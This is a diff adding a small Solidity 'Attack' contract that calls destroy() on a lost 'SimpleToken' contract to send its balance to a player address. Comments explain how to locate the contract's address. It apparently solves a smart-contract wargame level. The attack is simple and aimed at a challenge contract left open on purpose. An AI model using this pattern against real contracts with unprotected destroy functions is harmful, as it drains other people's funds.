@@ -36,4 +36,22 @@ contract SimpleToken {
     }
 }
 
+//you can find the lost address of the contract via script using rlp and keccak modules
+// Or you can find via explorer with the help of transaction at deployment time.
+interface ISimpleToken {
+    function destroy(address payable _recipient) external;
+}
+
+contract Attack {
+    ISimpleToken public simpleToken;
+    //passing the lost contract address
+    constructor(address payable _tokenAddress) {
+        simpleToken = ISimpleToken(_tokenAddress);
+    }
+    //passing the player address
+    function attack(address payable _recipient) public {
+        simpleToken.destroy(_recipient);
+    }
+}
+
 
